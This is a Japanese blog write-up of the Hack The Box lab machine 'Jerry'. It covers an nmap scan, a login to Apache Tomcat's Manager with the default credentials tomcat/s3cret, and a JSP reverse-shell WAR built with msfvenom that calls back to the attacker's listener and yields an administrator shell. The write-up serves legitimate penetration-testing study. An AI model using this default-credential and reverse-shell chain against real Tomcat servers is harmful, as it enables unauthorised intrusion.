# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
現在のランクはHackerです。
間違っていることも多いかと思いますが、よろしくお願いします。
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Jerry

<img width="619" alt="スクリーンショット 2020-07-22 17.17.37.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/bcc07545-3471-6edf-5856-870c660a906c.png">


HackTheBox公式より
Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.

ジェリーはHack The Box上では簡単なマシンの一つですが、Apache Tomcatが公開されていることが多く、一般的または弱いクレデンシャルで構成されていることが判明しているため、現実的です。

# スキャン
Jerry(10.10.10.95)に対して、スキャンを行います。
まずnmapからスキャンを開始します。
## nmap 

```
nmap -sC -sV -oN valentine.nmap 10.10.10.95
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う

```
kali@kali:~/htb$ nmap -sC -sV -Pn -oN jerry.nmap 10.10.10.95
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 01:30 EDT
Nmap scan report for 10.10.10.95
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.71 seconds
```

この結果から、8080番ポートでApache Tomcatが使えることが分かります。

![スクリーンショット 2020-07-22 13.26.56.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6aef7b66-4ff6-076a-3708-7d417f69b2a9.png)

searchsploitを使って、tomcat 7.0.88を検索してみましょう。
![スクリーンショット 2020-07-22 17.22.33.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1e910a71-6ec1-9c64-4545-064625e57978.png)
このスクリプトを使用してみた結果、対象の脆弱性を悪用することはできませんでした。

先ほどの、Apache TomcatのManager Appを押下したところ、Basic認証が現れました。
適当に文字を入れてみると、エラーページが出てきます。

![スクリーンショット 2020-07-22 17.00.11.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9383bc4b-9a32-afd7-814a-6fadacaaed85.png)
この中に
user:tomcat
password:s3cret
とあります。
これを使って、Basic認証を試してみましょう。

![スクリーンショット 2020-07-22 17.01.35.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c203b308-438d-4381-a14b-e01cde5e4975.png)

Managerページに入ることができました。
ちなみにuser:tomcat，password:s3cretはtomcat-users.xmlに記載されているデフォルトパスワードのようです。

下の方にスクロールして行くと、warファイルがアップロードできる箇所があります。
![スクリーンショット 2020-07-22 17.03.51.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/66d2b73d-6bb1-a376-3f3f-813e9833b6c7.png)
これを利用してreverse_shell接続できないか試してみましょう。

# 侵入
msfvenomを使ってreverse_shellするためのwarファイルを作成しましょう。

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f war > reverse.war
```

作成したreverse.warファイルをアップロードします。

netcatで通信を待ち受けておき、http://10.10.10.95:8080/reverse/にアクセスして発火させます。

![スクリーンショット 2020-07-22 17.05.58.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/880efd8a-b102-6973-89a3-3fa7e5fd9dcd.png)


![スクリーンショット 2020-07-22 17.06.12.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/7a4b4c23-99bf-3439-5c86-bf780bf97018.png)
シェルをゲットすることができます。
そしていきなり管理者権限でした。
![スクリーンショット 2020-07-22 17.14.46.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/593df714-bf09-fd33-d9ce-e1a6adb3b94d.png)
フラグは2つまとめて記載された"2 for the price of 1.txt"がありました。  
お疲れ様でした。
